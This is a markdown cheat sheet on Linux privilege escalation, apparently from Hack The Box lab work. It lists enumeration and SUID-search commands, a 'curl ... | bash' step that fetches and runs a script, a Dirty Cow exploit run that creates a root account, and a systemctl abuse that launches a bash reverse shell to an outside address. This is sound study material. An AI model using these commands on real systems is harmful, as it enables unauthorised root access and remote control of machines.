# Privilege Escalation Linux
[TOC]
###### tags: `Security` `PrivilegeEscalation`

# Reference
* [Rebootuser - Local Linux Enumeration & Privilege Escalation Cheat Sheet](https://www.rebootuser.com/?p=1623)
* [linuxprivchecker.py -- a Linux Privilege Escalation Check Script](https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123)
* [mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
* [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)

# Information Gathering
[Cheat Sheet - Linux|g0tm1lk - Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
## Script
```
cp /opt/Privilege_Escalation/LinEnum/LinEnum.sh .
python3 -m http.server 80
```
```
hype@Valentine:~$ curl 10.10.14.2/LinEnum.sh | bash
```
## Manual
### Operating System
#### Distribution
```
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release      # Debian based
cat /etc/redhat-release   # Redhat based
```
#### Kernel Version
```
cat /proc/version
uname -a
uname -mrs
```
#### Environmental Variables
```
```
### Users / Groups
```
id
who
```
```
sudo -l / sudo -ll
# If no command is specified, list the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host. 
www-data@jarvis:/$ sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
    
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
Run the command as a user other than the default target user (usually root). The user may be either a user name or a numeric user-ID (UID) prefixed with the ‘#’ character (e.g., #0 for UID 0). 
```
example: in `lxd` group: create virtual machine and mount root folder

### Applications & Services & Files
```
ps aux | grep root
ps -ef | grep root
```
```
cat /etc/services
```

```bash
# Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -1000 -type d 2>/dev/null
```

```bash
# SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -g=s -type f 2>/dev/null # = -perm -2000
# SUID (chmod 4000) - run as the owner, not the user who started it.
find / -perm -u=s -type f 2>/dev/null # = -perm -4000

# SGID or SUID
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
# Quicker search. Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID 
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done
# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
```
`-exec ls -la {} \;`
### Networking

### Confidential Information

### File Systems

# Privilege Escalation
## [Dirty Cow](https://dirtycow.ninja/)
Race condition in mm/gup.c in the Linux kernel 2.x through 4.x before 4.8.3
```
wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
hype@Valentine:~$ wget 10.10.14.2/dirtycow.c
hype@Valentine:~$ grep gcc dirty.c 
//   gcc -pthread dirty.c -o dirty -lcrypt
hype@Valentine:~$ gcc -pthread dirty.c -o dirty -lcrypt
hype@Valentine:~$ ./dirty 
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:figsoZwws4Zu6:0:0:pwned:/root:/bin/bash

mmap: 7fbb000ab000
hype@Valentine:~$ su firefart
Password: 
firefart@Valentine:/home/hype# id
uid=0(firefart) gid=0(root) groups=0(root)
```
## Tools
### [GTFOBins](https://gtfobins.github.io/)
GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.

#### example: systemctl
```
find / -perm -4000 2>/dev/null
pepper@jarvis:/$ find / -perm -4000 -ls 2>/dev/null
...
  1312201    172 -rwsr-x---   1 root     pepper     174520 Feb 17  2019 /bin/systemctl
...
```

search systemctl in GTFOBins. It said:
```
sudo sh -c 'cp $(which systemctl) .; chmod +s ./systemctl'

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```
So I create a file `wildfootw.service` & `reverse_shell.sh` in `/home/pepper`
in `wildfootw.service`:
```
[Service]
Type=oneshot
ExecStart=/bin/bash /home/pepper/reverse_shell.sh
[Install]
WantedBy=multi-user.target
```

in `reverse_shell.sh`:
```
bash -i >& /dev/tcp/10.10.14.207/7779 0>&1
```
```
systemctl link /home/pepper/wildfootw.service
systemctl start wildfootw.service
```